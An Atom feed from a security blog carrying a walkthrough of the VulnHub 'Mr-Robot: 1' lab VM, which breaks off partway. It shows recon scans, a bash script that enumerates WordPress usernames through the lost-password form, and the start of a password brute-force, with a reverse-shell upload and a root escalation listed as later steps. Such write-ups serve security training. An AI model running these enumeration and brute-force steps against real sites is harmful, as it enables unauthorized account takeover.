<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulnhub | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2016-08-15T21:18:22+10:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Mr-Robot: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/"/>
    <updated>2016-08-10T20:46:39+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1</id>
    <content type="html"><![CDATA[<hr />

<p>&ldquo;Based on the show, Mr. Robot. This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find. The VM isn&rsquo;t too difficult. There isn&rsquo;t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/jason,292/">Jason</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: Mr-Robot: 1 (<em>10.1.1.137/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li><code>robot.txt</code> sensitive information disclosure</li>
<li><code>WordPress</code> username and password bruteforce attack</li>
<li>Exploit Old NMAP <code>--interactive</code> privilege escalation vulnerability to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Scan specific vulnerability for WordPress CMS [<font color="FF8000">wpscan</font>]</li>
<li>Exploit WordPress administrator/editor account to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
<li>Enumeration and exploit the local priviledge vulnerability (<code>old NMAP --interactive</code> vulnerability) to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://wpscan.org/">wpscan</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.137  00:0c:29:61:51:fa   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:f3:e7:2a   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 3.021 seconds <span class="o">(</span>84.74 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.137</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.137/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-08-05 12:37:00 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.137                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 443/tcp on 10.1.1.137                    &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.137
</span><span class='line'>Host is up <span class="o">(</span>0.0037s latency<span class="o">)</span>.
</span><span class='line'>PORT    STATE SERVICE  VERSION
</span><span class='line'>80/tcp  open  http     Apache httpd
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'>443/tcp open  ssl/http Apache httpd
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.example.com
</span><span class='line'><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>www.example.com
</span><span class='line'><span class="p">|</span> Public Key <span class="nb">type</span>: rsa
</span><span class='line'><span class="p">|</span> Public Key bits: 1024
</span><span class='line'><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
</span><span class='line'><span class="p">|</span> Not valid before: 2015-09-16T10:45:03
</span><span class='line'><span class="p">|</span> Not valid after:  2025-09-13T10:45:03
</span><span class='line'><span class="p">|</span> MD5:   3c16 3b19 87c3 42ad <span class="m">6634</span> c1c9 d0aa fb97
</span><span class='line'><span class="p">|</span>_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
</span><span class='line'>MAC Address: 00:0C:29:61:51:FA <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span><span class='line'>OS details: Linux 3.10 - 3.19, Linux 3.2 - 4.0
</span><span class='line'>Uptime guess: 0.000 days <span class="o">(</span>since Fri Aug  <span class="m">5</span> 08:38:08 2016<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Only port <code>80</code> and <code>443</code> is found and <code>Apache</code> is the HTTP server.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port <code>80</code> found by port-scanning stage.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.137
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.5.29
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>tcn<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: list
</span><span class='line'>+ GET Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.wisec.it/sectou.php?id=4698ebdc59d15.&quot;</span>&gt;http://www.wisec.it/sectou.php?id<span class="o">=</span>4698ebdc59d15.&lt;/a&gt; The following alternatives <span class="k">for</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>index<span class="p">&amp;</span>rsquo<span class="p">;</span> were found: index.html, index.php
</span><span class='line'>+ OSVDB-3092: GET /admin/: This might be interesting<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>link<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/?p=23&quot;</span>&gt;http://10.1.1.137/?p<span class="o">=</span>23&lt;/a&gt;<span class="p">;</span> <span class="nv">rel</span><span class="o">=</span>shortlink
</span><span class='line'>+ GET /readme.html: This WordPress file reveals the installed version.
</span><span class='line'>+ GET /wp-links-opml.php: This WordPress script reveals the installed version.
</span><span class='line'>+ OSVDB-3092: GET /license.txt: License file found may identify site software.
</span><span class='line'>+ GET /admin/index.html: Admin login page/section found.
</span><span class='line'>+ GET Cookie wordpress_test_cookie created without the httponly flag
</span><span class='line'>+ GET /wp-login/: Admin login page/section found.
</span><span class='line'>+ GET /wordpress/: A Wordpress installation was found.
</span><span class='line'>+ GET /wp-admin/wp-login.php: Wordpress login found
</span><span class='line'>+ GET /blog/wp-login.php: Wordpress login found
</span><span class='line'>+ GET /wp-login.php: Wordpress login found
</span></code></pre></td></tr></table></div></figure></p>

<p><code>WordPress CMS</code> is found, also <code>/robots.txt</code> and <code>/license.txt</code> are found.</p>

<p>So I run <code>wpscan</code> to scan this WordPress CMS, and in the mean time, I go have a look at the two interesting files.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# wpscan <span class="p">&amp;</span>ndash<span class="p">;</span>url 10.1.1.137&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    __          _______   _____
</span><span class='line'>    <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
</span><span class='line'>     <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __
</span><span class='line'>      <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>
</span><span class='line'>       <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>        <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>
</span><span class='line'>    WordPress Security Scanner by the WPScan Team
</span><span class='line'>                   Version 2.8
</span><span class='line'>      Sponsored by Sucuri - https://sucuri.net
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   @&lt;em&gt;WPScan&lt;/em&gt;, @ethicalhack3r, @erwan_lr, pvdl, @&lt;em&gt;FireFart&lt;/em&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>i<span class="o">]</span> It seems like you have not updated the database <span class="k">for</span> some time.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/&quot;</span>&gt;http://10.1.1.137/&lt;/a&gt;
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Started: Fri Aug  <span class="m">5</span> 23:16:00 2016&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> robots.txt available under: <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/robots.txt&quot;</span>&gt;http://10.1.1.137/robots.txt&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> The WordPress <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/readme.html&quot;</span>&gt;http://10.1.1.137/readme.html&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span> file exists exposing a version number
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: SERVER: Apache
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> XML-RPC Interface available under: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/xmlrpc.php&quot;</span>&gt;http://10.1.1.137/xmlrpc.php&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> WordPress version 4.3.5 identified from rss generator&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Enumerating plugins from passive detection <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> No plugins found&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Finished: Fri Aug  <span class="m">5</span> 23:16:01 2016
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Requests Done: 48
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Memory used: 7.668 MB
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Elapsed <span class="nb">time</span>: 00:00:00
</span></code></pre></td></tr></table></div></figure></p>

<p>From the <code>wpscan</code> result, there is nothing special information. But from the robot file <code>/robots.txt</code>, I got the 1st flag!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>User-agent: *
</span><span class='line'>fsocity.dic
</span><span class='line'>key-1-of-3.txt
</span></code></pre></td></tr></table></div></figure></p>

<p>The first key found in the file <code>key-1-of-3.txt</code>: <font color='red'><code>073403c8a58a1f80d943455fb30724b9</code></font></p>

<p>And I got a dictionary file <code>fsocity.dic</code> as well.</p>

<p>Highly believed that I can brute force username / password by using this dictionary file, and I filtered it to include the strings which only between 4-8 digitals.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# grep -E <span class="p">&amp;</span>lsquo<span class="p">;</span>^<span class="o">[</span>a-zA-Z<span class="o">]</span><span class="p">&amp;</span>rsquo<span class="p">;</span> fsociety.dic <span class="p">|</span> sort -u <span class="p">|</span>  awk <span class="p">&amp;</span>lsquo<span class="p">;</span>length<span class="o">(</span><span class="nv">$1</span><span class="o">)</span> <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span><span class="m">8</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> length<span class="o">(</span><span class="nv">$1</span><span class="o">)</span> &gt;<span class="o">=</span> <span class="m">4</span> <span class="o">{</span> print <span class="nv">$1</span><span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; users.txt
</span><span class='line'>root@kali:~/mrRobot# ls -l
</span><span class='line'>total 7124
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root    <span class="m">1546</span> Aug  <span class="m">5</span> 08:48 10.1.1.137_nikto.txt
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root    <span class="m">1845</span> Aug  <span class="m">5</span> 08:38 10.1.1.137_nmap.txt
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root <span class="m">7245381</span> Aug  <span class="m">5</span> 23:49 fsociety.dic
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root   <span class="m">37007</span> Aug  <span class="m">7</span> 04:06 users.txt
</span><span class='line'>root@kali:~/mrRobot# wc -l users.txt
</span><span class='line'><span class="m">5247</span> users.txt
</span></code></pre></td></tr></table></div></figure></p>

<p>In order to brute force wordpress username, I could not find any tool on the Internet, so I write a simple script <code>enum_wp_users.sh</code> to do it.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;!/bin/bash&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;function usage<span class="o">(){</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="c">### wordpress username enumerator v0.1&amp;rdquo;</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="c">### by using wordpress&#39; lostpassword function.&amp;rdquo;</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>USAGE: <span class="nv">$0</span> &lt;base-url&gt; &lt;wordlist&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'><span class="o">}</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;function main<span class="o">(){</span>
</span><span class='line'>    <span class="nb">local </span><span class="nv">base_url</span><span class="o">=</span><span class="nv">$1</span>
</span><span class='line'>    <span class="nb">local </span><span class="nv">wordlist</span><span class="o">=</span><span class="nv">$2</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;for word in <span class="k">$(</span>cat <span class="s2">&quot;$wordlist&quot;</span><span class="k">)</span><span class="p">;</span> <span class="k">do</span>
</span><span class='line'>    <span class="k">if</span> ! curl -s --data <span class="s2">&quot;user_login=${word}&amp;amp;redirect_to=&amp;amp;wp-submit=Get+New+Password&quot;</span> <span class="s2">&quot;http://${base_url}/wp-login.php?action=lostpassword&quot;</span> <span class="p">|</span> grep -q ERROR<span class="p">;</span> <span class="k">then</span>
</span><span class='line'>        <span class="nb">echo</span> <span class="s2">&quot;Found valid username: ${word}&quot;</span>
</span><span class='line'>    <span class="k">fi</span>
</span><span class='line'><span class="k">done</span>
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">}</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;if <span class="o">[</span> -z <span class="nv">$2</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span><span class='line'>    usage
</span><span class='line'><span class="k">else</span>
</span><span class='line'>    main <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">$@</span><span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'><span class="k">fi</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>By using this script with filtered dictionary file <code>users.txt</code>, I found one valid username <code>elliot</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# ./enum_wp_users.sh 10.1.1.137 users.txt
</span><span class='line'>Found valid username: elliot
</span><span class='line'>Found valid username: Elliot
</span><span class='line'>Found valid username: ELLIOT
</span></code></pre></td></tr></table></div></figure></p>

<p>Then using wpscan to brute force password for the user <code>elliot</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# cat fsociety.dic <span class="p">|</span> sort -u <span class="p">|</span> awk <span class="p">&amp;</span>lsquo<span class="p">;</span>length<span class="o">(</span><span class="nv">$1</span><span class="o">)</span> <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span> <span class="m">16</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> length<span class="o">(</span><span class="nv">$1</span><span class="o">)</span> &gt;<span class="o">=</span> <span class="m">6</span> <span class="o">{</span> print <span class="nv">$1</span> <span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; pass.txt
